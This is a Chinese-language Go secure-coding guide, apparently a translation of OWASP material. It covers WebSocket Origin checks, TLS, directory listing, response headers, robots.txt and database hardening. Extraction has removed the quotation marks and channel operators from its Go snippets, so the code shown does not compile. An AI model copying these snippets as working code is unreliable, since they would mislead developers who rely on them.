\u5904\u7406HTTP\u8fde\u63a5\u65f6\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u65b9\u9762\u662f\uff0c\u9a8c\u8bc1HTTP\u5934\u5728\u8bbf\u95ee\u5916\u90e8\u7ad9\u70b9\u65f6\uff0c\u4e0d\u5305\u542b\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u3002\u65e2\u7136\u8fde\u63a5\u53ef\u80fd\u4e0d\u5b89\u5168\uff0c\u90a3\u4e48HTTP\u62a5\u5934\u5c31\u53ef\u80fd\u6cc4\u6f0f\u4fe1\u606f\u3002 Websockets WebSocket\u662f\u4e3aHTML 5\u5f00\u53d1\u7684\u4e00\u79cd\u65b0\u7684\u6d4f\u89c8\u5668\u529f\u80fd\uff0c\u5b83\u652f\u6301\u5b8c\u5168\u4ea4\u4e92\u5f0f\u5e94\u7528\u7a0b\u5e8f\u3002\u4f7f\u7528WebSockets\uff0c\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u90fd\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2aTCP\u5957\u63a5\u5b57\u53d1\u9001\u5f02\u6b65\u6d88\u606f\uff0c\u800c\u65e0\u9700\u4f7f\u7528\u957f\u8f6e\u8be2\u6216\u77ed\u8f6e\u8bad\u3002 \u672c\u8d28\u4e0a\uff0cWebSocket\u662f\u5ba2\u6237\u673a\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u6807\u51c6\u53cc\u5411TCP\u5957\u63a5\u5b57\u3002\u8fd9\u4e2a\u5957\u63a5\u5b57\u4ee5\u5e38\u89c4HTTP\u8fde\u63a5\u5f00\u59cb\uff0c\u7136\u540e\u5728HTTP\u63e1\u624b\u4e4b\u540e\u201c\u5347\u7ea7\u201d\u4e3aTCP\u5957\u63a5\u5b57\u3002\u4efb\u4f55\u4e00\u65b9\u90fd\u53ef\u4ee5\u5728\u63e1\u624b\u4e4b\u540e\u53d1\u9001\u6570\u636e\u3002 Origin header HTTP Websocket\u63e1\u624b\u4e2d\u7684 Origin header\u7528\u4e8e\u786e\u4fddWebsocket\u63a5\u53d7\u7684\u8fde\u63a5\u6765\u81ea\u53ef\u4fe1\u7684\u539f\u59cb\u57df\u3002\u6267\u884c\u5931\u8d25\u53ef\u80fd\u5bfc\u81f4\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020(CSRF)\u3002 \u670d\u52a1\u5668\u8d1f\u8d23\u5728\u521d\u59cbHTTP WebSocket\u63e1\u624b\u4e2d\u9a8c\u8bc1Origin\u5934\u3002 \u5982\u679c\u670d\u52a1\u5668\u672a\u5728\u521d\u59cbWebSocket\u63e1\u624b\u4e2d\u9a8c\u8bc1\u539f\u59cbheader\uff0c\u5219WebSocket\u670d\u52a1\u5668\u53ef\u80fd\u63a5\u53d7\u6765\u81ea\u4efb\u4f55\u6e90\u7684\u8fde\u63a5\u3002 \u4ee5\u4e0b\u793a\u4f8b\u4f7f\u7528Origin\u5934\u68c0\u67e5\uff0c\u4ee5\u9632\u6b62\u653b\u51fb\u8005\u6267\u884cCSWSH\uff08\u8de8\u7ad9\u70b9WebSocket\u52ab\u6301\uff09\u3002 \u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u9a8c\u8bc1 Host \u548c Origin \uff0c\u4ee5\u786e\u4fdd\u8bf7\u6c42\u7684 Origin \u662f\u53ef\u4fe1\u4efb\u7684 Origin \uff0c\u5426\u5219\u62d2\u7edd\u8fde\u63a5\u3002 \u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5\u6f14\u793a\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u68c0\u67e5\uff1a //Compare our origin with Host and act accordingly if r.Header.Get( Origin ) != http:// +r.Host { http.Error(w, Origin not allowed , 403) return } else { websocket.Handler(EchoHandler).ServeHTTP(w, r) } \u673a\u5bc6\u6027\u548c\u5b8c\u6574\u6027 Websocket\u901a\u4fe1\u901a\u9053\u53ef\u4ee5\u901a\u8fc7\u672a\u52a0\u5bc6\u7684TCP\u6216\u52a0\u5bc6\u7684TLS\u5efa\u7acb\u3002 \u5f53\u4f7f\u7528\u672a\u52a0\u5bc6\u7684Websockets\u65f6\uff0c URI scheme \u662f ws:// \uff0c\u5176\u9ed8\u8ba4\u7aef\u53e3\u662f 80 \u3002\u5982\u679c\u4f7f\u7528TLS Websockets, URI scheme \u662f wss:// \uff0c\u9ed8\u8ba4\u7aef\u53e3\u662f 443 \u3002 \u6d89\u53ca\u5230Websockets\u65f6\uff0c\u65e0\u8bba\u662f\u4f7f\u7528TLS\u65b9\u5f0f\u8fd8\u662f\u7528\u672a\u52a0\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u5fc5\u987b\u8003\u8651\u539f\u59cb\u8fde\u63a5\u3002 \u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u5c55\u793a\u8fde\u63a5\u4eceHTTP\u5347\u7ea7\u5230Websocket\u65f6\u53d1\u9001\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u5982\u679c\u5904\u7406\u4e0d\u5f53\u6240\u5e26\u6765\u7684\u98ce\u9669\u3002\u5728\u7b2c\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u5e38\u89c4HTTP\u8fde\u63a5\u6b63\u5728\u5347\u7ea7\u5230Websocket\u8fde\u63a5\uff1a \u6ce8\u610f\uff0c\u8bf7\u6c42\u5934\u5305\u542b\u6b64\u6b21\u4f1a\u8bdd\u7684cookie\u3002\u4e3a\u786e\u4fdd\u4e0d\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f\uff0c\u5347\u7ea7\u8fde\u63a5\u65f6\u5e94\u8be5\u4f7f\u7528TLS\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u5728\u540e\u4e00\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u548cWebsocket\u4e00\u6837\uff0c\u6211\u4eec\u7684\u8fde\u63a5\u5347\u7ea7\u8bf7\u6c42\u4f7f\u7528SSL\uff1a \u8ba4\u8bc1\u548c\u6388\u6743 Websockets\u4e0d\u5904\u7406\u8ba4\u8bc1\u6216\u6388\u6743\uff0c\u8fd9\u610f\u5473\u7740\u5fc5\u987b\u4f7f\u7528\u8bf8\u5982cookie\u3001HTTP\u8eab\u4efd\u9a8c\u8bc1\u6216TLS\u8eab\u4efd\u9a8c\u8bc1\u7b49\u673a\u5236\u6765\u786e\u4fdd\u5b89\u5168\u6027\u3002\u6709\u5173\u8fd9\u65b9\u9762\u7684\u66f4\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u672c\u6587\u6863\u7684\u201c \u8eab\u4efd\u9a8c\u8bc1 \u201d\u548c\u201c \u8bbf\u95ee\u63a7\u5236 \u201d\u90e8\u5206\u3002 \u8f93\u5165\u6570\u636e\u6e05\u7406 \u4e0e\u6765\u81ea\u4e0d\u53ef\u4fe1\u6e90\u7684\u4efb\u4f55\u6570\u636e\u4e00\u6837\uff0c\u5e94\u8be5\u5bf9\u6570\u636e\u8fdb\u884c\u9002\u5f53\u7684\u6e05\u7406\u548c\u7f16\u7801\u3002\u6709\u5173\u8fd9\u4e9b\u4e3b\u9898\u7684\u66f4\u8be6\u7ec6\u5185\u5bb9\uff0c\u8bf7\u53c2\u9605\u672c\u6587\u6863\u7684\u201c \u6570\u636e\u6e05\u7406 \u201d\u548c\u201c \u8f93\u51fa\u7f16\u7801 \u201d\u90e8\u5206\u3002 \u7cfb\u7edf\u914d\u7f6e \u4fdd\u6301\u66f4\u65b0\u662f\u5b89\u5168\u7684\u5173\u952e\u3002\u56e0\u6b64\uff0c\u5f00\u53d1\u4eba\u5458\u5e94\u8be5\u5c06Go\u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c\uff0c\u5305\u62ecWeb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u7684\u5916\u90e8\u5305\u548c\u6846\u67b6\u3002 \u5173\u4e8eGo\u4e2d\u7684HTTP\u8bf7\u6c42\uff0c\u4f60\u9700\u8981\u77e5\u9053\u4efb\u4f55\u4f20\u5165\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u90fd\u662f\u4f7f\u7528HTTP/1.1\u6216HTTP/2\u6765\u5b8c\u6210\u7684\u3002\u5982\u679c\u8bf7\u6c42\u662f\uff1a req, _ := http.NewRequest( POST , url, buffer) req.Proto = HTTP/1.0 Proto \u5c06\u88ab\u5ffd\u7565\uff0c\u8bf7\u6c42\u4f1a\u4f7f\u7528HTTP/1.1\u53d1\u51fa\u3002 \u76ee\u5f55\u5217\u8868 \u5982\u679c\u5f00\u53d1\u4eba\u5458\u5fd8\u8bb0\u7981\u7528\u76ee\u5f55\u5217\u8868\uff08OWASP\u4e5f\u79f0\u5176\u4e3a\u76ee\u5f55\u7d22\u5f15\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u76ee\u5f55\u5bfc\u822a\u51fa\u4e00\u4e9b\u654f\u611f\u6587\u4ef6\u3002 \u5982\u679c\u4f60\u8fd0\u884c\u4e00\u4e2aGo Web\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f60\u8fd8\u5e94\u8be5\u5c0f\u5fc3\uff1a http.ListenAndServe( :8080 , http.FileServer(http.Dir( /tmp/static ))) \u5982\u679c\u4f60\u8bbf\u95ee localhost:8080 \uff0c\u5b83\u5c06\u6253\u5f00\u4f60\u7684index.html\u3002\u4f46\u662f\u5047\u8bbe\u4f60\u6709\u4e00\u4e2a\u6d4b\u8bd5\u76ee\u5f55 localhost:8080/test/ \uff0c\u5185\u90e8\u6709\u654f\u611f\u6587\u4ef6\uff1a \u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\uff1f Go\u5c1d\u8bd5\u5728\u76ee\u5f55\u4e2d\u627e\u5230index.html\uff0c\u5982\u679c\u5b83\u4e0d\u5b58\u5728\uff0c\u5b83\u5c06\u663e\u793a\u76ee\u5f55\u5217\u8868\u3002 \u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6709\u4e09\u4e2a\u53ef\u884c\u7684\u89e3\u51b3\u65b9\u6848: \u5728\u4f60\u7684web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7981\u7528\u76ee\u5f55\u5217\u8868 \u9650\u5236\u5bf9\u4e0d\u5fc5\u8981\u7684\u76ee\u5f55\u548c\u6587\u4ef6\u7684\u8bbf\u95ee \u4e3a\u6bcf\u4e2a\u76ee\u5f55\u521b\u5efa\u4e00\u4e2a\u7d22\u5f15\u6587\u4ef6 \u8fd9\u91cc\u6211\u4eec\u5c06\u63cf\u8ff0\u4e00\u79cd\u7981\u7528\u76ee\u5f55\u5217\u8868\u7684\u65b9\u6cd5\uff0c\u9996\u5148\uff0c\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u6765\u68c0\u67e5\u6240\u8bf7\u6c42\u7684\u8def\u5f84\uff0c\u4ee5\u53ca\u662f\u5426\u53ef\u4ee5\u663e\u793a\u8be5\u8def\u5f84\u3002 type justFilesFilesystem struct { fs http.FileSystem } func (fs justFilesFilesystem) Open(name string) (http.File, error) { f, err := fs.fs.Open(name) if err != nil { return nil, err } return neuteredReaddirFile{f}, nil } \u7136\u540e\u6211\u4eec\u5728 http.ListenAndServe \u4e2d\u4f7f\u7528\u5b83\uff1a fs := justFilesFilesystem{http.Dir( tmp/static/ )} http.ListenAndServe( :8080 , http.StripPrefix( /tmp/static , http.FileServer(fs))) \u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u4ec5\u5141\u8bb8\u663e\u793a tmp/static \u8def\u5f84\u3002\u5f53\u6211\u4eec\u8bd5\u56fe\u76f4\u63a5\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u5f97\u5230\uff1a \u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u83b7\u53d6 test/ \u76ee\u5f55\u5217\u8868\uff0c\u6211\u4eec\u5c06\u5f97\u5230\u76f8\u540c\u7684\u9519\u8bef \u5220\u9664/\u7981\u7528\u4f60\u4e0d\u9700\u8981\u7684\u5185\u5bb9 \u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5220\u9664\u6240\u6709\u4e0d\u9700\u8981\u7684\u529f\u80fd\u70b9\u548c\u6587\u4ef6\u3002\u6d4b\u8bd5\u4ee3\u7801\u548c\u51fd\u6570\uff0c\u53ea\u5e94\u8be5\u7559\u5728\u5f00\u53d1\u4eba\u5458\u5c42\uff0c\u800c\u4e0d\u662f\u6bcf\u4e2a\u4eba\u90fd\u80fd\u770b\u5230\u7684\u4f4d\u7f6e\u3002\u6700\u7ec8\u7248\u672c (\u51c6\u5907\u4e0a\u751f\u4ea7\u7684\u7248\u672c) \u4e0d\u9700\u8981\u4efb\u4f55\u6d4b\u8bd5\u4ee3\u7801\u548c\u51fd\u6570\u3002 \u6211\u4eec\u8fd8\u5e94\u8be5\u68c0\u67e5HTTP\u54cd\u5e94\u5934\u3002\u5220\u9664\u54cd\u5e94\u5934\u4e2d\u66b4\u9732\u7684\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982: \u64cd\u4f5c\u7cfb\u7edf\u7248\u672c Webserver\u7248\u672c \u6846\u67b6\u6216\u7f16\u7a0b\u8bed\u8a00\u7248\u672c \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u4fe1\u606f\u6765\u68c0\u67e5\u4f60\u516c\u5f00\u7684\u7248\u672c\u4e2d\u7684\u6f0f\u6d1e\uff0c\u56e0\u6b64\u5efa\u8bae\u5220\u9664\u5b83\u4eec\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cGo\u4e0d\u4f1a\u516c\u5f00\u8fd9\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u5982\u679c\u4f60\u4f7f\u7528\u4efb\u4f55\u7c7b\u578b\u7684\u5916\u90e8\u5305\u6216\u6846\u67b6\uff0c\u4e0d\u8981\u5fd8\u8bb0\u4ed4\u7ec6\u68c0\u67e5\u3002 \u7c7b\u4f3c\u8fd9\u6837\u7684\uff1a w.Header().Set( X-Request-With , Go Vulnerable Framework 1.2 ) \u5728\u4ee3\u7801\u4e2d\u641c\u7d22\uff0c\u66b4\u9732\u7684HTTP\u5934\u7684\u4ee3\u7801\uff0c\u7136\u540e\u5220\u9664\u5b83\u3002 \u4f60\u8fd8\u53ef\u4ee5\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u652f\u6301\u54ea\u4e9bHTTP\u65b9\u6cd5\u3002\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u53ea\u63a5\u53d7 POST \u548c GET \u8bf7\u6c42\uff0c\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u5b9e\u73b0CORS\uff1a w.Header().Set( Access-Control-Allow-Methods , POST, GET ) \u4e0d\u8981\u62c5\u5fc3\u7981\u7528WebDAV\u4e4b\u7c7b\u7684\u4e1c\u897f\uff0c\u56e0\u4e3a\u5982\u679c\u8981\u5b9e\u73b0WebDAV\u670d\u52a1\u5668\uff0c\u9700\u8981\u5bfc\u5165\u4e00\u4e2a \u5305 \u3002 \u5b9e\u73b0\u66f4\u597d\u7684\u5b89\u5168\u6027 \u8c03\u6574\u597d\u5fc3\u6001\uff0c\u7136\u540e\u9075\u5faaWeb\u670d\u52a1\u5668\uff0c\u6d41\u7a0b\u548c\u670d\u52a1\u5e10\u6237\u4e0a\u7684 \u6700\u5c0f\u6743\u9650\u539f\u5219 \u3002 \u5173\u6ce8web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u9519\u8bef\u5904\u7406\u3002\u53d1\u751f\u5f02\u5e38\u65f6\uff0c\u5b89\u5168\u5730\u5904\u7406\u9519\u8bef\u3002 \u4f60\u53ef\u4ee5\u67e5\u770b\u672c\u6307\u5357\u4e2d\u7684 \u9519\u8bef\u5904\u7406 ](https://www.giac.org/paper/gsec/2693/implementation-methodology-information-security-management-system-to-comply-bs-7799-requi/104600)) )\u548c \u65e5\u5fd7\u8bb0\u5f55 \u90e8\u5206\uff0c\u4ee5\u83b7\u53d6\u6709\u5173\u6b64\u4e3b\u9898\u7684\u66f4\u591a\u4fe1\u606f\u3002 \u9632\u6b62\u5728 robots.txt \u6587\u4ef6\u4e2d\u66b4\u9732\u76ee\u5f55\u7ed3\u6784\u3002robots.txt\u662f\u4e00\u4e2a\u65b9\u5411\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5b89\u5168\u63a7\u4ef6\u3002 \u91c7\u7528\u767d\u540d\u5355\u65b9\u6cd5\uff1a User-agent: * Allow: /sitemap.xml Allow: /index Allow: /contact Allow: /aboutus Disallow: / \u4e0a\u9762\u7684\u793a\u4f8b\u5c06\u5141\u8bb8\u4efb\u4f55\u7528\u6237\u4ee3\u7406\u6216\u673a\u5668\u4eba\u7d22\u5f15\u8fd9\u4e9b\u7279\u5b9a\u9875\u9762\uff0c\u5e76\u7981\u6b62\u5176\u4f59\u9875\u9762\u3002 \u8fd9\u6837\u5c31\u4e0d\u4f1a\u6cc4\u9732\u654f\u611f\u6587\u4ef6\u5939\u6216\u9875\u9762 - \u4f8b\u5982\u7ba1\u7406\u8def\u5f84\u6216\u5176\u4ed6\u91cd\u8981\u6570\u636e\u3002 \u5c06\u5f00\u53d1\u73af\u5883\u4e0e\u751f\u4ea7\u73af\u5883\u7684\u7f51\u7edc\u9694\u79bb\u5f00\u6765\u3002\u4e3a\u5f00\u53d1\u4eba\u5458\u548c\u6d4b\u8bd5\u7ec4\uff0c\u63d0\u4f9b\u6b63\u786e\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u66f4\u597d\u7684\u662f\u521b\u5efa\u989d\u5916\u7684\u5b89\u5168\u5c42\u6765\u4fdd\u62a4\u5b83\u4eec\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5f00\u53d1\u73af\u5883\u66f4\u5bb9\u6613\u6210\u4e3a\u653b\u51fb\u7684\u76ee\u6807\u3002 \u6700\u540e\uff0c\u4f46\u4ecd\u7136\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u8981\u6709\u4e00\u4e2a\u8f6f\u4ef6\u66f4\u6539\u63a7\u5236\u7cfb\u7edf\u6765\u7ba1\u7406\u548c\u8bb0\u5f55Web\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\uff08\u5f00\u53d1\u548c\u751f\u4ea7\u73af\u5883\uff09\u4e2d\u7684\u66f4\u6539\u3002\u6709\u8bb8\u591a\u5728\u4f60\u81ea\u5df1\u4e3b\u673a\u4e0a\u642d\u5efa\u7c7b\u4f3cGithub\u7684\u514b\u9686\u53ef\u4ee5\u7528\u4e8e\u6b64\u76ee\u7684\u3002 \u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf\uff1a \u867d\u7136\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf\u4e0d\u662fGo\u7279\u5b9a\u7684\u95ee\u9898\uff0c\u4f46\u4ee5\u4e0b\u90e8\u5206\u5c06\u7b80\u8981\u6982\u8ff0\u8be5\u6982\u5ff5\u53ca\u5176\u5b9e\u8df5\u3002 \u8d44\u4ea7\u7ba1\u7406\u5305\u62ec\u7ec4\u7ec7\u6267\u884c\u7684\u4e00\u7cfb\u5217\u6d3b\u52a8\uff0c\u4ee5\u4fbf\u6839\u636e\u7ec4\u7ec7\u76ee\u6807\u5b9e\u73b0\u8d44\u4ea7\u7684\u6700\u4f73\u914d\u7f6e\uff0c\u4ee5\u53ca\u5bf9\u6bcf\u9879\u8d44\u4ea7\u6240\u9700\u5b89\u5168\u7ea7\u522b\u7684\u8bc4\u4f30\u3002\u5e94\u8be5\u6ce8\u610f\u7684\u662f\uff0c\u5728\u672c\u8282\u4e2d\uff0c\u5f53\u6211\u4eec\u63d0\u5230\u8d44\u4ea7\u65f6\uff0c\u6211\u4eec\u4e0d\u4ec5\u8ba8\u8bba\u7cfb\u7edf\u7684\u7ec4\u4ef6\uff0c\u800c\u4e14\u8fd8\u8ba8\u8bba\u8f6f\u4ef6\u3002 \u5b9e\u65bd\u8be5\u7cfb\u7edf\u6d89\u53ca\u7684\u6b65\u9aa4\u5982\u4e0b\uff1a 1. \u786e\u5b9a\u4fe1\u606f\u5b89\u5168\u5728\u4f01\u4e1a\u4e2d\u7684\u91cd\u8981\u6027\u3002 2. \u5b9a\u4e49AMS\u7684\u8303\u56f4\u3002 3. \u5b9a\u4e49\u5b89\u5168\u7b56\u7565\u3002 4. \u5efa\u7acb\u5b89\u5168\u7ec4\u7ec7\u7ed3\u6784\u3002 5. \u8bc6\u522b\u548c\u5206\u7c7b\u8d44\u4ea7\u3002 6. \u8bc6\u522b\u548c\u8bc4\u4f30\u98ce\u9669\u3002 7. \u89c4\u5212\u98ce\u9669\u7ba1\u7406\u3002 8. \u5b9e\u65bd\u98ce\u9669\u7f13\u89e3\u7b56\u7565\u3002 9. \u5199\u4e0b\u9002\u7528\u6027\u58f0\u660e\u3002 10. \u57f9\u8bad\u5458\u5de5\u5e76\u6811\u7acb\u5b89\u5168\u610f\u8bc6\u3002 11. \u76d1\u63a7\u5e76\u67e5\u770bAMS\u6027\u80fd\u3002 12. \u7ef4\u62a4AMS\u5e76\u786e\u4fdd\u6301\u7eed\u6539\u8fdb\u3002 \u53ef\u4ee5\u5728 \u6b64\u5904 \u627e\u5230\u5bf9\u6b64\u5b9e\u73b0\u66f4\u6df1\u5165\u7684\u5206\u6790\u3002 \u6570\u636e\u5e93\u5b89\u5168 \u5173\u4e8eOWASP SCP\u7684\u8fd9\u4e00\u8282\uff0c\u5c06\u8ba8\u8bba\u5f00\u53d1\u4eba\u5458\u548cDBA\uff0c\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u6570\u636e\u5e93\u65f6\uff0c\u9700\u8981\u91c7\u53d6\u7684\u6240\u6709\u6570\u636e\u5e93\u5b89\u5168\u95ee\u9898\u548c\u64cd\u4f5c\u3002 Go\u6ca1\u6709\u6570\u636e\u5e93\u9a71\u52a8\u7a0b\u5e8f\uff0c\u800c\u662f\u5728 database/sql \u5305\u4e0a\u6709\u4e00\u4e2a\u6838\u5fc3\u63a5\u53e3\u9a71\u52a8\u7a0b\u5e8f\u3002\u8fd9\u610f\u5473\u7740\u5728\u4f7f\u7528\u6570\u636e\u5e93\u8fde\u63a5\u65f6\u9700\u8981\u6ce8\u518cSQL\u9a71\u52a8\u7a0b\u5e8f(\u4f8b\u5982: MariaDB \u3001 sqlite3 )\u3002 \u6700\u4f73\u5b9e\u8df5 \u5728Go\u4e2d\u5b9e\u73b0\u6570\u636e\u5e93\u4e4b\u524d\uff0c\u60a8\u5e94\u8be5\u6ce8\u610f\u4e0b\u9762\u6211\u4eec\u5c06\u8ba8\u8bba\u7684\u4e00\u4e9b\u914d\u7f6e\uff1a \u5b89\u5168\u6570\u636e\u5e93\u5b89\u88c5 \u66f4\u6539/\u8bbe\u7f6eroot\u8d26\u6237\u7684\u5bc6\u7801\uff1b \u5220\u9664\u672c\u5730\u4e3b\u673a\u5916\u90e8\u53ef\u8bbf\u95ee\u7684root\u5e10\u6237\uff1b \u5220\u9664\u4efb\u4f55\u533f\u540d\u7528\u6237\u5e10\u6237\uff1b \u5220\u9664\u4efb\u4f55\u73b0\u6709\u7684\u6d4b\u8bd5\u6570\u636e\u5e93\uff1b \u5220\u9664\u4efb\u4f55\u4e0d\u5fc5\u8981\u7684\u5b58\u50a8\u8fc7\u7a0b\u3001\u5b9e\u7528\u7a0b\u5e8f\u5305\u3001\u4e0d\u5fc5\u8981\u7684\u670d\u52a1\u3001vendor\u5185\u5bb9(\u4f8b\u5982\u793a\u4f8b\u6a21\u5f0f)\u3002 \u5b89\u88c5\u6570\u636e\u5e93\u4e0eGo\u4e00\u8d77\u4f7f\u7528\u6240\u9700\u7684\u6700\u5c11\u529f\u80fd\u548c\u9009\u9879\u96c6\u3002 \u7981\u7528web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u4e0d\u9700\u8981\u8fde\u63a5\u5230\u6570\u636e\u5e93\u7684\u4efb\u4f55\u9ed8\u8ba4\u5e10\u6237\u3002 \u53e6\u5916\uff0c\u7531\u4e8e\u9a8c\u8bc1\u6570\u636e\u5e93\u4e0a\u7684\u8f93\u5165\u548c\u7f16\u7801\u8f93\u51fa\u975e\u5e38\u91cd\u8981\uff0c\u6240\u4ee5\u8bf7\u52a1\u5fc5\u9605\u8bfb\u672c\u6307\u5357\u7684 \u8f93\u5165\u9a8c\u8bc1 \u548c \u8f93\u51fa\u7f16\u7801 \u90e8\u5206\u3002 \u5728\u4f7f\u7528\u6570\u636e\u5e93\u65f6\uff0c\u8fd9\u57fa\u672c\u4e0a\u53ef\u4ee5\u9002\u7528\u4e8e\u4efb\u4f55\u7f16\u7a0b\u8bed\u8a00\u3002 \u6570\u636e\u5e93\u8fde\u63a5 \u6982\u5ff5 sql.Open \u4e0d\u8fd4\u56de\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u800c\u662f\u8fd4\u56de *DB \uff1a\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u3002\u5f53\u8fd0\u884c\u4e00\u4e2a\u6570\u636e\u5e93\u64cd\u4f5c\uff08\u4f8b\u5982\u67e5\u8be2\uff09\u65f6\uff0c\u4ece\u6c60\u4e2d\u53d6\u51fa\u4e00\u4e2a\u53ef\u7528\u8fde\u63a5\uff0c\u8be5\u8fde\u63a5\u5e94\u8be5\u5728\u64cd\u4f5c\u5b8c\u6210\u540e\u7acb\u5373\u8fd4\u56de\u5230\u8fde\u63a5\u6c60\u4e2d\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u4ec5\u5728\u9996\u6b21\u6267\u884c\u6570\u636e\u5e93\u64cd\u4f5c\uff08\u5982\u67e5\u8be2\uff09\u65f6\u624d\u4f1a\u6253\u5f00\u4e00\u4e2a\u6570\u636e\u5e93\u8fde\u63a5\u3002 sql.Open \u5e76\u4e0d\u4f1a\u6d4b\u8bd5\u6570\u636e\u5e93\u8fde\u63a5\uff1a\u6570\u636e\u5e93\u51ed\u636e\u9519\u8bef\uff0c\u8981\u5728\u7b2c\u4e00\u4e2a\u6570\u636e\u5e93\u64cd\u4f5c\u6267\u884c\u65f6\u624d\u4f1a\u89e6\u53d1\u3002 \u6839\u636e\u7ecf\u9a8c\uff0c\u5e94\u8be5\u59cb\u7ec8\u4f7f\u7528 database/sql \u63a5\u53e3\u7684\u4e0a\u4e0b\u6587\u53d8\u4f53(\u4f8b\u5982QueryContext())\uff0c\u5e76\u63d0\u4f9b\u9002\u5f53\u7684 \u4e0a\u4e0b\u6587 \u3002 \u6765\u81eaGo\u5b98\u65b9\u6587\u6863\uff1a\u201cPackage\u4e0a\u4e0b\u6587\u5b9a\u4e49\u4e86Context\u7c7b\u578b\uff0c\u5b83\u8de8API\u8fb9\u754c\u548c\u8fdb\u7a0b\u4e4b\u95f4\u4f20\u9012\u622a\u6b62\u65e5\u671f\uff0c\u53d6\u6d88\u4fe1\u53f7\u548c\u5176\u4ed6\u8bf7\u6c42\u8303\u56f4\u7684\u503c\u3002\u201d \u5728\u6570\u636e\u5e93\u7ea7\u522b\uff0c\u5f53\u4e0a\u4e0b\u6587\u88ab\u53d6\u6d88\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u63d0\u4ea4\u4e8b\u52a1\uff0c\u5c06\u56de\u6eda\u4e8b\u52a1\uff0crows(\u6765\u81eaQueryContext)\u5c06\u88ab\u5173\u95ed\uff0c\u5e76\u8fd4\u56de\u6240\u6709\u8d44\u6e90\u3002 package main import ( context database/sql fmt log time _ github.com/go-sql-driver/mysql ) type program struct { base context.Context cancel func() db *sql.DB } func main() { db, err := sql.Open( mysql , user:@/cxdb ) if err != nil { log.Fatal(err) } p := program{db: db} p.base, p.cancel = context.WithCancel(context.Background()) // Wait for program termination request, cancel base context on request. go func() { osSignal := // ... select { case -p.base.Done(): case -osSignal: p.cancel() } // Optionally wait for N milliseconds before calling os.Exit. }() err = p.doOperation() if err != nil { log.Fatal(err) } } func (p *program) doOperation() error { ctx, cancel := context.WithTimeout(p.base, 10 * time.Second) defer cancel() var version string err := p.db.QueryRowContext(ctx, SELECT VERSION(); ).Scan( version) if err != nil { return fmt.Errorf( unable to read version %v , err) } fmt.Println( Connected to: , version) } \u8fde\u63a5\u5b57\u7b26\u4e32\u7684\u4fdd\u62a4 \u4e3a\u4e86\u4fdd\u8bc1\u8fde\u63a5\u5b57\u7b26\u4e32\u7684\u5b89\u5168\u6027\uff0c\u6700\u597d\u5c06\u8eab\u4efd\u9a8c\u8bc1\u7ec6\u8282\u653e\u5728\u516c\u5171\u8bbf\u95ee\u4e4b\u5916\u7684\u72ec\u7acb\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002 \u4e0d\u8981\u5c06\u914d\u7f6e\u6587\u4ef6\u653e\u5728 /home/public_html/ \u4e2d\uff0c\u800c\u662f\u8003\u8651\u653e\u5728 /home/private/configdb.xml \u4e2d(\u53d7\u4fdd\u62a4\u7684\u533a\u57df) connectionDB serverDB localhost /serverDB userDB f00 /userDB passDB f00?bar#ItsP0ssible /passDB /connectionDB \u7136\u540e\u4f60\u53ef\u4ee5\u5728Go\u6587\u4ef6\u4e2d\u8c03\u7528config.xml\u6587\u4ef6\uff1a configFile, _ := os.Open( ../private/configDB.xml ) 